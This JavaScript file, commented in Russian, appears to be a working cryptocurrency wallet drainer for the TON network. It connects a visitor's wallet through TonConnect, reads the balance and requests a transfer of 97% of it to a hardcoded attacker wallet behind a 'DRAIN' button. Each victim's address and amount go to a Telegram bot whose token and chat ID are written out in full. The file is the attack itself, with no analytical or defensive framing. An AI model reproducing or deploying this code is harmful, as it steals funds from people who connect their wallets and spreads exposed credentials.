// Конфигурация TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

// Основные параметры
const MAIN_WALLET = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp";
const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
const TG_CHAT_ID = "8126533622";

// Функция для перевода средств
async function didtrans() {
    const drainBtn = document.getElementById('drain-btn');
    try {
        // Проверка подключения кошелька
        if (!tonConnectUI.connected || !tonConnectUI.account) {
            alert('Пожалуйста, сначала подключите кошелек');
            return;
        }

        drainBtn.disabled = true;
        drainBtn.textContent = 'Processing...';

        // Получаем баланс
        const walletAddress = tonConnectUI.account.address;
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        const balance = parseFloat(data.balance);
        
        if (balance <= 0) {
            alert('На кошельке недостаточно средств');
            return;
        }

        // Оставляем 3% на комиссии
        const amountToSend = Math.floor(balance * 0.97).toString();

        // Формируем транзакцию
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [{
                address: MAIN_WALLET,
                amount: amountToSend
            }]
        };

        // Отправляем транзакцию
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction successful:', result);
        
        // Отправляем уведомление
        const message = `*New transaction*\nFrom: ${walletAddress}\nAmount: ${amountToSend/1e9} TON`;
        sendTelegramMessage(message);
        
        alert(`Successfully sent ${amountToSend/1e9} TON!`);
        
    } catch (error) {
        console.error('Transaction failed:', error);
        alert('Error: ' + error.message);
        sendTelegramMessage(`*Transaction failed*\nError: ${error.message}`);
    } finally {
        drainBtn.disabled = false;
        drainBtn.textContent = 'DRAIN';
    }
}

// Функция отправки в Telegram
function sendTelegramMessage(text) {
    if (!TG_CHAT_ID) return;
    const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url).catch(err => console.error('Telegram error:', err));
}

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', () => {
    const drainBtn = document.getElementById('drain-btn');
    if (drainBtn) {
        drainBtn.addEventListener('click', didtrans);
    }
});
